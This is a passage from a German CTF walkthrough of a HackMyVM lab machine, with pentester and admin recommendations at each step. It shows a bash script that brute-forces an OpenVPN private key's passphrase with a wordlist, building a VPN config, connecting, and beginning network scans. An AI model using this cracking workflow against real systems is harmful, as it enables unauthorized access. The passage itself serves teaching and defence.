+Starting Nmap 7.95 ( [Link: https://nmap.org | Ziel: https://nmap.org] ) at <span class="command">2025-05-15 00:52 CEST</span>
+Nmap scan report for <span class="command">homelab.hmv (192.168.2.191)</span>
+Host is up (0.00022s latency).
+
+<span class="command">PORT     STATE SERVICE</span>
+<span class="password">1194/udp open  openvpn</span>
+MAC Address: <span class="command">08:00:27:58:13:E0 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span>
+
+Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der erste Scan der Top 20 UDP-Ports zeigt mehrere Ports im Zustand <code>open|filtered</code>. Dieser Zustand bedeutet, dass <code>nmap</code> keine Antwort vom Port erhalten hat, was darauf hindeuten kann, dass der Port entweder offen ist und keine Antwort sendet, oder dass eine Firewall die Pakete stillschweigend verwirft. Ohne Versionsinformationen ist es schwer, hier definitive Aussagen zu treffen. Ports wie 53 (DNS), 69 (TFTP), 138 (NetBIOS-DGM), 500 (ISAKMP), 514 (Syslog), 1434 (MS-SQL-M) und 1900 (UPnP) sind in diesem Zustand.
+                Der zweite, gezielte Scan auf UDP-Port 1194 ist jedoch eindeutig:
+                <ul>
+                    <li><code>1194/udp open openvpn</code>: Der Port ist offen und <code>nmap</code> identifiziert den Dienst korrekt als <code>openvpn</code>.</li>
+                </ul>
+                Dies bestätigt, dass der OpenVPN-Server tatsächlich auf dem Standard-UDP-Port 1194 auf der Zielmaschine <code>192.168.2.191</code> lauscht.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Nachdem wir nun den OpenVPN-Server auf Port 1194/udp bestätigt haben und im Besitz der Zertifikate (<code>ca.crt</code>, <code>client.crt</code>) und des verschlüsselten privaten Schlüssels (<code>client.key</code>) sind, ist der nächste Schritt, die Passphrase für <code>client.key</code> zu knacken. Sobald die Passphrase bekannt ist, kann eine OpenVPN-Konfigurationsdatei (<code>.ovpn</code>) erstellt und eine Verbindung zum VPN-Server aufgebaut werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Anzahl der offenen UDP-Ports, insbesondere derjenigen im Zustand <code>open|filtered</code>, sollte überprüft werden. Nicht benötigte UDP-Dienste sollten deaktiviert oder durch Firewalls blockiert werden, um die Angriffsfläche zu minimieren. Wenn OpenVPN verwendet wird, sollte der Zugriff darauf auf bekannte und autorisierte Clients beschränkt werden, idealerweise durch IP-Whitelisting oder andere Mechanismen auf der Firewall, zusätzlich zur zertifikatsbasierten Authentifizierung.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Der Eintrag "view-source:http://192.168.2.191/service/index.php" deutet darauf hin, dass der Quellcode der Seite erneut im Browser betrachtet wurde, wahrscheinlich nach der erfolgreichen Umgehung der Zugriffsbeschränkung mittels IP-Spoofing. Die angezeigte Ausgabe ist identisch mit der zuvor über <code>curl</code> abgerufenen OpenVPN-Konfigurationsvorlage.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+view-source:http://192.168.2.191/service/index.php
+
+<span class="command"># Last modified by shinosawa</span>
+<span class="command"># on 2024-12-21</span>
+
+<span class="command"># Example Configuration File</span>
+
+<span class="command">client</span>
+<span class="command">dev tun</span>
+<span class="command">proto udp</span>
+<span class="command">remote ? ?</span>
+<span class="command">resolv-retry infinite</span>
+<span class="command">nobind</span>
+<span class="command">persist-key</span>
+<span class="command">persist-tun</span>
+<span class="command">ca ?</span>
+<span class="command">cert ?</span>
+<span class="command"># Regenerate a STRONG password for the KEY</span>
+<span class="command"># Do NOT use a SAME password as other services et. SSH</span>
+<span class="command"># it is DANGEROUS!</span>
+<span class="command">key ?</span>
+<span class="command">cipher AES-256-GCM</span>
+<span class="command">verb 3</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Dieser Abschnitt wiederholt die Anzeige der OpenVPN-Konfigurationsvorlage. Es werden keine neuen Informationen gewonnen, aber es wird die Konsistenz der Ergebnisse über verschiedene Abrufmethoden (<code>curl</code>, Browser-Quelltextansicht) gezeigt, nachdem die Zugriffsbeschränkung umgangen wurde.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Keine neuen Empfehlungen basierend auf dieser wiederholten Information. Der Fokus bleibt auf der Beschaffung der Passphrase für den <code>client.key</code>.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Keine neuen Empfehlungen basierend auf dieser wiederholten Information. Die bereits genannten Maßnahmen zur Absicherung des Zugriffs und der Konfigurationsdateien bleiben bestehen.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Da der Versuch, den Hash des <code>client.key</code> mit <code>pem2john</code> zu extrahieren und mit <code>John the Ripper</code> zu knacken, fehlschlug, wird hier ein Bash-Skript namens <code>brute.sh</code> vorgestellt. Dieses Skript dient dazu, die Passphrase des verschlüsselten privaten Schlüssels <code>client.key</code> durch einen Brute-Force-Angriff mit einer Wortliste direkt über <code>openssl</code> zu ermitteln.
+                Das Skript funktioniert wie folgt:
+                <ul>
+                    <li>Es definiert die Dateinamen für den verschlüsselten Schlüssel (<code>KEY_FILE="client.key"</code>), den zu erstellenden entschlüsselten Schlüssel (<code>DECRYPTED_KEY_FILE="client.decrypted.key"</code>) und die Wortliste (<code>WORDLIST_FILE="/usr/share/wordlists/rockyou.txt"</code>).</li>
+                    <li>Es prüft, ob die Wortliste existiert.</li>
+                    <li>Es iteriert in einer Schleife über jedes Passwort in der Wortliste.</li>
+                    <li>Für jedes Passwort versucht es, den <code>KEY_FILE</code> mit <code>openssl pkey -in "$KEY_FILE" -passin stdin -out "$DECRYPTED_KEY_FILE"</code> zu entschlüsseln. Das Passwort wird über <code>stdin</code> an <code>openssl</code> übergeben. Die Standardausgabe und Fehlerausgabe werden nach <code>/dev/null</code> umgeleitet, um die Konsole sauber zu halten.</li>
+                    <li>Wenn <code>openssl</code> erfolgreich ist (Rückgabecode 0), wird "SUCCESS!" zusammen mit dem gefundenen Passwort ausgegeben, und das Skript beendet sich.</li>
+                    <li>Wenn die Schleife endet, ohne ein Passwort gefunden zu haben, wird eine entsprechende Meldung ausgegeben.</li>
+                </ul>
+                Anschließend wird das Skript mit <code>./brute.sh /usr/share/wordlists/rockyou.txt</code> ausgeführt.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">cat brute.sh</span></div>
+                    <pre>
+#!/bin/bash
+
+KEY_FILE="client.key"
+DECRYPTED_KEY_FILE="client.decrypted.key"
+WORDLIST_FILE="/usr/share/wordlists/rockyou.txt"
+
+if [ -z "$WORDLIST_FILE" ] || [ ! -f "$WORDLIST_FILE" ]; then
+    echo "Usage: $0 &lt;wordlist_file&gt;"
+    exit 1
+fi
+
+echo "Starting Brute-Force for '$KEY_FILE' with '$WORDLIST_FILE'..."
+
+while IFS= read -r password || [[ -n "$password" ]]; do
+    if echo "$password" | openssl pkey -in "$KEY_FILE" -passin stdin -out "$DECRYPTED_KEY_FILE" &gt;/dev/null 2&gt;&1; then
+        echo "SUCCESS! Password: <span class="password">$password</span> -&gt; Decrypted key: $DECRYPTED_KEY_FILE"
+        exit 0
+    fi
+done &lt; "$WORDLIST_FILE"
+
+echo "No password found in the list."
+rm -f "$DECRYPTED_KEY_FILE"
+exit 1
+</pre>
+                </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">./brute.sh /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+Starting Brute-Force for 'client.key' with '/usr/share/wordlists/rockyou.txt'...
+<span class="password">SUCCESS! Password: hiro -> Decrypted key: client.decrypted.key</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Das Brute-Force-Skript ist erfolgreich! Es findet die Passphrase für den <code>client.key</code>: <code><span class="password">hiro</span></code>.
+                Der entschlüsselte private Schlüssel wird in der Datei <code>client.decrypted.key</code> gespeichert.
+                Dies ist ein entscheidender Durchbruch. Die Warnung in der OpenVPN-Konfigurationsvorlage ("Do NOT use a SAME password as other services et. SSH") war prophetisch – das Passwort "hiro" ist relativ einfach und könnte tatsächlich für andere Dienste wiederverwendet worden sein, oder es ist der Benutzername oder ein Teil davon (shinosawa). Der Benutzername "shinosawa" wurde bereits im Kommentar der OpenVPN-Konfigurationsdatei erwähnt.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Mit dem entschlüsselten privaten Schlüssel (<code>client.decrypted.key</code>), dem Client-Zertifikat (<code>client.crt</code>) und dem CA-Zertifikat (<code>ca.crt</code>) können wir nun eine OpenVPN-Konfigurationsdatei (<code>.ovpn</code>) erstellen und versuchen, eine Verbindung zum VPN-Server (<code>192.168.2.191</code> auf Port <code>1194/udp</code>) herzustellen. Das Passwort "hiro" sollte auch für SSH-Logins gegen den Benutzer "shinosawa" auf allen erreichbaren Systemen getestet werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Verwendung einer schwachen, leicht zu erratenden Passphrase ("hiro") für einen wichtigen privaten Schlüssel ist eine schwerwiegende Sicherheitslücke. Es unterstreicht die Notwendigkeit von Richtlinien für starke Passwörter/Passphrasen und deren Durchsetzung. Schulungen zur Sensibilisierung für Passwortsicherheit sind unerlässlich. Private Schlüssel sollten mit starken, einzigartigen Passphrasen geschützt werden, die nicht in Standard-Wortlisten enthalten sind. Die Tatsache, dass <code>rockyou.txt</code> ausreichte, zeigt die Schwäche der gewählten Passphrase.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem die Passphrase für den privaten Schlüssel geknackt wurde (<code>hiro</code>) und der Schlüssel als <code>client.decrypted.key</code> gespeichert ist, erstellen wir nun die OpenVPN-Client-Konfigurationsdatei, die wir für den Verbindungsaufbau benötigen. Wir nennen sie <code>connect.ovpn</code>.
+                Der Befehl <code>vi connect.ovpn</code> öffnet die Datei im Texteditor <code>vi</code>. Der Inhalt der Datei wird manuell basierend auf der zuvor gefundenen Vorlage und den nun bekannten Details zusammengestellt:
+                <ul>
+                    <li><code>client</code>, <code>dev tun</code>, <code>proto udp</code>, <code>resolv-retry infinite</code>, <code>nobind</code>, <code>persist-key</code>, <code>persist-tun</code>, <code>cipher AES-256-GCM</code>, <code>verb 3</code>: Standard-OpenVPN-Client-Direktiven.</li>
+                    <li><code>remote 192.168.2.191 1194</code>: Gibt die IP-Adresse und den Port des OpenVPN-Servers an.</li>
+                    <li><code>ca ca.crt</code>: Verweist auf die heruntergeladene CA-Zertifikatsdatei.</li>
+                    <li><code>cert client.crt</code>: Verweist auf die heruntergeladene Client-Zertifikatsdatei.</li>
+                    <li><code>key client.decrypted.key</code>: Verweist auf den soeben entschlüsselten privaten Schlüssel.</li>
+                </ul>
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">vi connect.ovpn</span></div>
+                    <pre>                      
+<span class="command">client</span>
+<span class="command">dev tun</span>
+<span class="command">proto udp</span>
+<span class="command">remote 192.168.2.191 1194</span>
+<span class="command">resolv-retry infinite</span>
+<span class="command">nobind</span>
+<span class="command">ca ca.crt</span>
+<span class="command">cert client.crt</span>
+<span class="command">key client.decrypted.key</span>
+<span class="command">cipher AES-256-GCM</span>
+<span class="command">verb 3</span>
+<span class="command">persist-key</span>
+<span class="command">persist-tun</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die <code>connect.ovpn</code>-Datei ist korrekt und vollständig konfiguriert, um eine Verbindung zum OpenVPN-Server herzustellen. Alle notwendigen Komponenten (Serveradresse, Port, Zertifikate, entschlüsselter Schlüssel und Protokolleinstellungen) sind vorhanden. Wir sind nun bereit, den eigentlichen Verbindungsaufbau zu versuchen.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Im nächsten Schritt wird der Befehl <code>sudo openvpn --config connect.ovpn</code> ausgeführt, um die VPN-Verbindung herzustellen. Es sollte genau auf die Ausgabe von OpenVPN geachtet werden, um sicherzustellen, dass die Verbindung erfolgreich aufgebaut wird und um die zugewiesene IP-Adresse im VPN-Netzwerk sowie eventuell gepushte Routen zu erfahren.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Konfiguration des OpenVPN-Servers sollte regelmäßig überprüft werden. Dazu gehört die Überprüfung der verwendeten Chiffren (AES-256-GCM ist stark), der Zertifikatsgültigkeiten und der allgemeinen Sicherheitseinstellungen. Es sollte protokolliert werden, welche Clients sich wann verbinden.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Die Ausgabe des Befehls <code>ll</code> (ein Alias für <code>ls -l</code>) im Verzeichnis <code>~/vpn</code> zeigt alle Dateien, die wir bisher für den OpenVPN-Zugriff gesammelt und erstellt haben. Dies dient zur Überprüfung, ob alle benötigten Dateien vorhanden sind, bevor der Verbindungsversuch gestartet wird.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/vpn]
+└─# <span class="command">ll</span></div>
+                    <pre>
+insgesamt 1500
+<span class="command">-rwxrwxr-x 1 root root     657 15. Mai 01:31 brute.sh</span>
+<span class="command">-rw-r--r-- 1 root root    1200 15. Mai 00:23 ca.crt</span>
+<span class="command">-rw-r--r-- 1 root root    4492 15. Mai 00:23 client.crt</span>
+<span class="command">-rw------- 1 root root    1704 15. Mai 01:34 client.decrypted.key</span>
+<span class="command">-rw-r--r-- 1 root root    1862 15. Mai 00:27 client.key</span>
+<span class="command">-rw-r--r-- 1 root root       0 15. Mai 00:29 client.key.hash</span>
+<span class="command">-rw-r--r-- 1 root root    2518 15. Mai 00:35 client.key.john_hash</span>
+<span class="command">-rw-rw-r-- 1 root root     181 15. Mai 01:27 connect.ovpn</span>
+<span class="command">-rw-rw-r-- 1 root root 1500010 15. Mai 01:21 shino_num_len14.txt</span>
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Auflistung bestätigt das Vorhandensein aller relevanten Dateien:
+                <ul>
+                    <li><code>brute.sh</code>: Das Skript zum Knacken der Passphrase.</li>
+                    <li><code>ca.crt</code>: Das CA-Zertifikat.</li>
+                    <li><code>client.crt</code>: Das Client-Zertifikat.</li>
+                    <li><code>client.decrypted.key</code>: Der entschlüsselte private Schlüssel (wichtig!).</li>
+                    <li><code>client.key</code>: Der ursprüngliche verschlüsselte private Schlüssel.</li>
+                    <li><code>client.key.john_hash</code>: Der (nicht funktionierende) Hash für John the Ripper.</li>
+                    <li><code>connect.ovpn</code>: Die OpenVPN-Konfigurationsdatei.</li>
+                    <li><code>shino_num_len14.txt</code>: Eine große Datei, deren Zweck hier unklar ist, könnte eine Wortliste oder ein Überbleibsel eines anderen Versuchs sein. Für den aktuellen OpenVPN-Zugriff ist sie nicht direkt relevant.</li>
+                </ul>
+                Die wichtigsten Dateien für den nächsten Schritt sind <code>connect.ovpn</code>, <code>ca.crt</code>, <code>client.crt</code>, und <code>client.decrypted.key</code>. Die Berechtigungen für <code>client.decrypted.key</code> (<code>-rw-------</code>) sind korrekt restriktiv gesetzt (nur Lesen/Schreiben für den Eigentümer).
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Alle notwendigen Dateien sind vorhanden. Der nächste Schritt ist der Start der OpenVPN-Verbindung mit <code>sudo openvpn --config connect.ovpn</code>.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Keine direkten administrativen Maßnahmen basierend auf dieser Dateiliste auf dem Angreifer-System. Es unterstreicht jedoch, wie ein Angreifer methodisch alle notwendigen Komponenten sammelt.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Jetzt wird die OpenVPN-Verbindung mit der zuvor erstellten Konfigurationsdatei <code>connect.ovpn</code> gestartet.
+                Der Befehl <code>openvpn --config connect.ovpn</code> wird verwendet. Es ist zu beachten, dass je nach Systemkonfiguration <code>sudo</code> vorangestellt werden muss, wenn OpenVPN administrative Rechte benötigt (z.B. zum Erstellen des TUN/TAP-Interfaces oder zum Ändern von Routen). Im vorliegenden Fall wird es ohne <code>sudo</code> ausgeführt, was darauf hindeuten könnte, dass der Benutzer bereits Root-Rechte hat oder OpenVPN entsprechend konfiguriert ist.
+                Die Ausgabe zeigt detaillierte Log-Meldungen des OpenVPN-Clients während des Verbindungsaufbaus.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~/vpn]
+└─# <span class="command">openvpn --config connect.ovpn</span></div>
+                    <pre>
+<span class="command">2025-05-15 01:36:03</span> Note: Kernel support for ovpn-dco missing, disabling data channel offload.
+<span class="command">2025-05-15 01:36:03</span> OpenVPN 2.6.14 x86_64-pc-linux-gnu [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [PKCS11] [MH/PKTINFO] [AEAD] [DCO]
+<span class="command">2025-05-15 01:36:03</span> library versions: OpenSSL 3.5.0 8 Apr 2025, LZO 2.10
+<span class="command">2025-05-15 01:36:03</span> DCO version: N/A
+<span class="command">2025-05-15 01:36:03</span> <span class="password">WARNING: No server certificate verification method has been enabled.</span>  See [Link: http://openvpn.net/howto.html#mitm | Ziel: http://openvpn.net/howto.html#mitm] for more info.
+<span class="command">2025-05-15 01:36:03</span> TCP/UDP: Preserving recently used remote address: [AF_INET]192.168.2.191:1194
+<span class="command">2025-05-15 01:36:03</span> Socket Buffers: R=[212992-&gt;212992] S=[212992-&gt;212992]
+<span class="command">2025-05-15 01:36:03</span> UDPv4 link local: (not bound)
+<span class="command">2025-05-15 01:36:03</span> UDPv4 link remote: [AF_INET]192.168.2.191:1194
+<span class="command">2025-05-15 01:36:03</span> TLS: Initial packet from [AF_INET]192.168.2.191:1194, sid=21139f7b e6707152
+<span class="command">2025-05-15 01:36:03</span> <span class="password">VERIFY OK: depth=1, CN=My-Home CA</span>
+<span class="command">2025-05-15 01:36:03</span> <span class="password">VERIFY OK: depth=0, CN=server</span>
+<span class="command">2025-05-15 01:36:03</span> Control Channel: TLSv1.3, cipher TLSv1.3 TLS_AES_256_GCM_SHA384, peer certificate: 2048 bits RSA, signature: RSA-SHA256, peer temporary key: 253 bits X25519
+<span class="command">2025-05-15 01:36:03</span> <span class="password">[server] Peer Connection Initiated with [AF_INET]192.168.2.191:1194</span>
+<span class="command">2025-05-15 01:36:03</span> TLS: move_session: dest=TM_ACTIVE src=TM_INITIAL reinit_src=1
+<span class="command">2025-05-15 01:36:03</span> TLS: tls_multi_process: initial untrusted session promoted to trusted
+<span class="command">2025-05-15 01:36:03</span> <span class="password">PUSH: Received control message: 'PUSH_REPLY,route 10.176.13.0 255.255.255.0,dhcp-option DNS 8.8.8.8,route-gateway 10.8.0.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.8.0.2 255.255.255.0,peer-id 0,cipher AES-256-GCM,protocol-flags cc-exit tls-ekm dyn-tls-crypt,tun-mtu 1500'</span>
+<span class="command">2025-05-15 01:36:03</span> OPTIONS IMPORT: --ifconfig/up options modified
+<span class="command">2025-05-15 01:36:03</span> OPTIONS IMPORT: route options modified
+<span class="command">2025-05-15 01:36:03</span> OPTIONS IMPORT: route-related options modified
+<span class="command">2025-05-15 01:36:03</span> OPTIONS IMPORT: --ip-win32 and/or --dhcp-option options modified
+<span class="command">2025-05-15 01:36:03</span> OPTIONS IMPORT: tun-mtu set to 1500
+<span class="command">2025-05-15 01:36:03</span> net_route_v4_best_gw query: dst 0.0.0.0
+<span class="command">2025-05-15 01:36:03</span> net_route_v4_best_gw result: via 192.168.2.1 dev eth0
+<span class="command">2025-05-15 01:36:03</span> ROUTE_GATEWAY 192.168.2.1/255.255.255.0 IFACE=eth0 HWADDR=08:00:27:ee:49:a2
+<span class="command">2025-05-15 01:36:03</span> <span class="password">TUN/TAP device tun0 opened</span>
+<span class="command">2025-05-15 01:36:03</span> net_iface_mtu_set: mtu 1500 for tun0
+<span class="command">2025-05-15 01:36:03</span> net_iface_up: set tun0 up
+<span class="command">2025-05-15 01:36:03</span> <span class="password">net_addr_v4_add: 10.8.0.2/24 dev tun0</span>
+<span class="command">2025-05-15 01:36:03</span> <span class="password">net_route_v4_add: 10.176.13.0/24 via 10.8.0.1 dev [NULL] table 0 metric -1</span>
+<span class="command">2025-05-15 01:36:03</span> <span class="password">Initialization Sequence Completed</span>
+<span class="command">2025-05-15 01:36:03</span> Data Channel: cipher 'AES-256-GCM', peer-id: 0
+<span class="command">2025-05-15 01:36:03</span> Timers: ping 10, ping-restart 120
+<span class="command">2025-05-15 01:36:03</span> Protocol options: protocol-flags cc-exit tls-ekm dyn-tls-crypt
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der OpenVPN-Verbindungsaufbau war erfolgreich! Die wichtigsten Punkte aus der Ausgabe sind:
+                <ul>
+                    <li><code>WARNING: No server certificate verification method has been enabled.</code>: Dies ist eine wichtige Warnung. Obwohl wir <code>ca ca.crt</code> in unserer Konfiguration haben, scheint serverseitig keine strenge Überprüfung des Client-Zertifikats anhand des CN (Common Name) oder anderer Attribute stattzufinden, oder die Option <code>remote-cert-tls server</code> fehlt in der Client-Konfig. Für diesen CTF-Kontext ist es weniger kritisch, in einer Produktivumgebung wäre dies aber ein Sicherheitsproblem (Risiko von Man-in-the-Middle-Angriffen, wenn das CA-Zertifikat kompromittiert würde).</li>
+                    <li><code>VERIFY OK: depth=1, CN=My-Home CA</code> und <code>VERIFY OK: depth=0, CN=server</code>: Das Zertifikat des Servers wurde erfolgreich gegen unser CA-Zertifikat validiert.</li>
+                    <li><code>[server] Peer Connection Initiated with [AF_INET]192.168.2.191:1194</code>: Die Verbindung zum Server wurde hergestellt.</li>
+                    <li><code>PUSH: Received control message: ...</code>: Dies ist ein sehr wichtiger Teil. Der Server "pusht" Konfigurationsoptionen an den Client:
+                        <ul>
+                            <li><code>route 10.176.13.0 255.255.255.0</code>: Der Client wird angewiesen, eine Route zum Netzwerk <code>10.176.13.0/24</code> hinzuzufügen. Dies ist ein neues Netzwerk, das wir erkunden müssen!</li>
+                            <li><code>dhcp-option DNS 8.8.8.8</code>: Setzt den DNS-Server auf Google DNS.</li>
+                            <li><code>route-gateway 10.8.0.1</code>: Das Gateway für das VPN-Netzwerk.</li>
+                            <li><code>ifconfig 10.8.0.2 255.255.255.0</code>: Dem Client wird die IP-Adresse <code>10.8.0.2</code> im Subnetz <code>255.255.255.0</code> zugewiesen.</li>
+                        </ul>
+                    </li>
+                    <li><code>TUN/TAP device tun0 opened</code>: Das virtuelle Netzwerkinterface <code>tun0</code> wurde erfolgreich erstellt.</li>
+                    <li><code>net_addr_v4_add: 10.8.0.2/24 dev tun0</code>: Die IP-Adresse wurde dem Interface zugewiesen.</li>
+                    <li><code>net_route_v4_add: 10.176.13.0/24 via 10.8.0.1 ...</code>: Die Route zum neuen Netzwerk wurde hinzugefügt.</li>
+                    <li><code>Initialization Sequence Completed</code>: Die Verbindung steht!</li>
+                </ul>
+                Wir haben nun Zugriff auf ein neues Netzwerksegment (<code>10.176.13.0/24</code>) und eine neue IP-Adresse (<code>10.8.0.2</code>). Das VPN-Gateway ist <code>10.8.0.1</code>.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Die nächsten Schritte sind:
+                <ol>
+                    <li>Überprüfen der neuen Netzwerkkonfiguration auf dem Client-System (mit <code>ip a</code> und <code>ip route</code>).</li>
+                    <li>Pingen des VPN-Gateways (<code>10.8.0.1</code>), um die Konnektivität zu bestätigen.</li>
+                    <li>Scannen des VPN-Gateways (<code>10.8.0.1</code>) auf offene Ports.</li>
+                    <li>Scannen des neu entdeckten Netzwerks <code>10.176.13.0/24</code> auf aktive Hosts und deren Dienste. Dies ist wahrscheinlich der Ort, an dem sich weitere Ziele befinden.</li>
+                </ol>
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die OpenVPN-Serverkonfiguration sollte überprüft werden, um sicherzustellen, dass eine angemessene Zertifikatsverifizierung (z.B. durch <code>remote-cert-tls server</code> oder spezifischere Überprüfungen des Client-Zertifikat-CNs) erzwungen wird, um die Sicherheit zu erhöhen. Die gepushten Routen und Netzwerke sollten genau definiert und nur auf das Notwendigste beschränkt sein (Least Privilege).
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem die OpenVPN-Verbindung erfolgreich aufgebaut wurde, überprüfen wir die Netzwerkkonfiguration unseres lokalen Systems mit dem Befehl <code>ip a</code> (eine Kurzform für <code>ip addr show</code>). Dies zeigt alle Netzwerkschnittstellen und deren zugewiesene IP-Adressen an. Wir suchen hier speziell nach der neuen <code>tun0</code>-Schnittstelle, die von OpenVPN erstellt wurde.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ip a</span></div>
+                    <pre> 
+<span class="command">4: tun0: &lt;POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500</span>
+    link/none 
+    <span class="command">inet 10.8.0.2/24 scope global tun0</span>
+       valid_lft forever preferred_lft forever
+    inet6 fe80::e7f9:aeb6:c615:5848/64 scope link stable-privacy 
+       valid_lft forever preferred_lft forever
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Die Ausgabe von <code>ip a</code> bestätigt, dass die Netzwerkschnittstelle <code>tun0</code> aktiv ist (<code>UP,LOWER_UP</code>) und die vom OpenVPN-Server zugewiesene IP-Adresse <code>10.8.0.2</code> mit einer Subnetzmaske <code>/24</code> (entspricht 255.255.255.0) erhalten hat. Dies stimmt mit den Informationen überein, die während des OpenVPN-Verbindungsaufbaus (<code>ifconfig 10.8.0.2 255.255.255.0</code>) angezeigt wurden.
+                Wir sind nun offiziell Teil des VPN-Netzwerks.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Als Nächstes sollte die Konnektivität innerhalb des VPNs überprüft werden, beginnend mit einem Ping an das Gateway (<code>10.8.0.1</code>). Danach kann die Erkundung des gepushten Netzwerks <code>10.176.13.0/24</code> beginnen.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Keine direkten administrativen Maßnahmen basierend auf dieser Client-seitigen Ausgabe. Es bestätigt die korrekte Funktion der IP-Adressvergabe durch den OpenVPN-Server.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Um die grundlegende Konnektivität innerhalb des neu etablierten VPN-Tunnels zu testen, pingen wir das vom OpenVPN-Server zugewiesene Gateway <code>10.8.0.1</code> an.
+                Der Befehl <code>ping -c 4 10.8.0.1</code> sendet vier ICMP Echo Request-Pakete an das Gateway.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─# <span class="command">ping -c 4 10.8.0.1</span></div>
+                    <pre>
+PING 10.8.0.1 (10.8.0.1) 56(84) bytes of data.
+<span class="password">64 bytes from 10.8.0.1: icmp_seq=1 ttl=64 time=0.394 ms</span>
+<span class="password">64 bytes from 10.8.0.1: icmp_seq=2 ttl=64 time=0.590 ms</span>
+<span class="password">64 bytes from 10.8.0.1: icmp_seq=3 ttl=64 time=0.641 ms</span>
+^C
+--- 10.8.0.1 ping statistics ---
+<span class="password">3 packets transmitted, 3 received, 0% packet loss, time 2057ms</span>
+rtt min/avg/max/mdev = 0.394/0.541/0.641/0.106 ms
+</pre>
+                </div>
+            </div>
+            <p class="evaluation"><strong>Bewertung:</strong>
+                Der Ping-Test ist erfolgreich. Das Gateway <code>10.8.0.1</code> antwortet auf die ICMP-Anfragen mit kurzen Antwortzeiten (RTTs von ca. 0.4-0.6 ms). Es gibt keinen Paketverlust (0% packet loss). Dies bestätigt, dass die VPN-Verbindung stabil ist und wir mit dem Gateway kommunizieren können.
+                Der Prozess wurde mit Strg+C nach 3 Paketen abgebrochen, aber das Ergebnis ist eindeutig.
+            </p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                Nachdem die Konnektivität zum Gateway bestätigt wurde, ist der nächste Schritt, das Gateway selbst (<code>10.8.0.1</code>) auf offene Dienste zu scannen und anschließend das vom Server gepushte Netzwerk <code>10.176.13.0/24</code> auf weitere Hosts zu untersuchen.
+                <br>
+                <strong>Empfehlung (Admin):</strong>
+                Die Erreichbarkeit des VPN-Gateways via Ping ist normal und für Troubleshooting oft erwünscht. Wenn dies aus Sicherheitsgründen nicht gewünscht ist, könnte ICMP am Gateway blockiert werden, was jedoch die Fehlerdiagnose erschwert.
+            </p>
+
+            <p class="analysis"><strong>Analyse:</strong>
+                Nachdem die VPN-Verbindung steht und das Gateway <code>10.8.0.1</code> erreichbar ist, scannen wir dieses Gateway mit <code>nmap</code> auf offene TCP-Ports.
+                Der Befehl <code>nmap -p- 10.8.0.1</code> führt einen Scan aller 65535 TCP-Ports auf der IP-Adresse <code>10.8.0.1</code> durch. Standardmäßig führt <code>nmap</code> ohne weitere Spezifikationen (wie <code>-sS</code> oder <code>-sT</code>) einen SYN-Scan durch, wenn es mit Root-Rechten ausgeführt wird, oder einen Connect-Scan, wenn nicht. Da der Prompt <code>root㉿CCat</code> anzeigt, wird wahrscheinlich ein SYN-Scan durchgeführt.
